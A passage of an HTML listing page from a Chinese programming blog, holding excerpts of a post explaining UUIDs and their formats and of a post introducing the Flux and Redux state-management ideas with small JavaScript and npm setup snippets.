UUID是指在一台机器上生成的数字，它保证对在同一时空中的所有机器都是唯一的。通常平台会提供生成的API。按照开放软件基金会(OSF)制定的标准计算，用到了以太网卡地址、纳秒级时间、芯片ID码和许多可能的数字
UUID由以下几部分的组合：
（1）当前日期和时间，UUID的第一个部分与时间有关，如果你在生成一个UUID之后，过几秒又生成一个UUID，则第一个部分不同，其余相同。
（2）时钟序列。
（3）全局唯一的IEEE机器识别号，如果有网卡，从网卡MAC地址获得，没有网卡以其他方式获得。
UUID的唯一缺陷在于生成的结果串会比较长。关于UUID这个标准使用最普遍的是微软的GUID(Globals Unique Identifiers)。在ColdFusion中可以用CreateUUID()函数很简单地生成UUID，其格式为：xxxxxxxx-xxxx- xxxx-xxxxxxxxxxxxxxxx(8-4-4-16)，其中每个 x 是 0-9 或 a-f 范围内的一个十六进制的数字。而标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (8-4-4-4-12)，可以从cflib 下载CreateGUID() UDF进行转换。
应用：
使用UUID的好处在分布式的软件系统中（比如：DCE/RPC, COM+,CORBA）就能体现出来，它能保证每个节点所生成的标识都不会重复，并且随着WEB服务等整合技术的发展，UUID的优势将更加明显。根据使用的特定机制，UUID不仅需要保证是彼此不相同的，或者最少也是与公元3400年之前其他任何生成的通用唯一标识符有非常大的区别。UUID最少在3000+年内不会重复。
通用唯一标识符还可以用来指向大多数的可能的物体。微软和其他一些软件公司都倾向使用全球唯一标识符（GUID），这也是通用唯一标识符的一种类型，可用来指向组建对象模块对象和其他的软件组件。第一个通用唯一标识符是在网络计算机系统（NCS）中创建，并且随后成为开放软件基金会（OSF）的分布式计算环境（DCE）的组件。
代码：
C#
1
2
3
4
5
6
7
8
9
10
11
using System;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24459b258535bc71ca00d07d25218c5a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92a7454ddfbecfddbb7eecefcffa3e6a/" rel="bookmark">
			老生常谈之Flux与Redux思想
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redux是一个通用的前端状态管理库，它不仅广泛应用于 React App，在 Wepy、Flutter 等框架中也随处可见它的身影，可谓是一招鲜吃遍天，它同时深受喜欢函数式编程(Functional Programming)人们的追捧，今天我就来和大家聊一聊Redux的基本思想。
Flux Flux是Facebook用于构建客户端Web应用程序的基本架构，我们可以将Flux看做一种应用程序中的数据流的设计模式，而Redux正是基于Flux的核心思想实现的一套解决方案，它也得到了原作者的肯定。
首先，在Flux中会有以下几个角色的出现：
Dispacher：调度器，接收到Action，并将它们发送给Store。Action：动作消息，包含动作类型与动作描述。Store：数据中心，持有应用程序的数据，并会响应Action消息。View：应用视图，可展示Store数据，并实时响应Store的更新。 从通讯的角度还可将其视为Action请求层 -&gt; Dispatcher传输层 -&gt; Store处理层 -&gt; View视图层。
单向数据流 Flux应用中的数据以单一方向流动：
视图产生动作消息，将动作传递给调度器。调度器将动作消息发送给每一个数据中心。数据中心再将数据传递给视图。 单一方向数据流还具有以下特点：
集中化管理数据。常规应用可能会在视图层的任何地方或回调进行数据状态的修改与存储，而在Flux架构中，所有数据都只放在Store中进行储存与管理。可预测性。在双向绑定或响应式编程中，当一个对象改变时，可能会导致另一个对象发生改变，这样会触发多次级联更新。对于Flux架构来讲，一次Action触发，只能引起一次数据流循环，这使得数据更加可预测。方便追踪变化。所有引起数据变化的原因都可由Action进行描述，而Action只是一个纯对象，因此十分易于序列化或查看。 Flux的工作流 从上面的章节中我们大概知道了Flux中各个角色的职责，那现在我们再结合着简单的代码示例讲解一下他们是如何构成一整个工作流的： 上图中有一个Action Creator的概念，其实他们就是用于辅助创建Action对象，并传递给Dispatcher：
function addTodo(desc) { const action = { type: 'ADD_TODO', payload: { id: Date.now(), done: false, desciption: desc } } dispatcher(action) } 复制代码 在这里我还是希望通过代码的形式进行简单的描述，会更直观一点，首先初始化一个项目：
mkdir flux-demo &amp;&amp; cd flux-demo npm init -y &amp;&amp; npm i react flux touch index.js 复制代码 然后，我们创建一个Dispatcher对象，它的本质是Flux系统中的事件系统，用于触发事件与响应回调，而且在Flux中仅会有一个全局的Dispatcher对象：
import { Dispatcher } from 'flux'; const TodoDispatcher = new Dispatcher(); 复制代码 接着，注册一个Store，响应Action方法：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/92a7454ddfbecfddbb7eecefcffa3e6a/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/431/">«</a>
	<span class="pagination__item pagination__item--current">432/516</span>
	<a class="pagination__item pagination__item--next btn" href="/page/433/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程鬼谷子的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>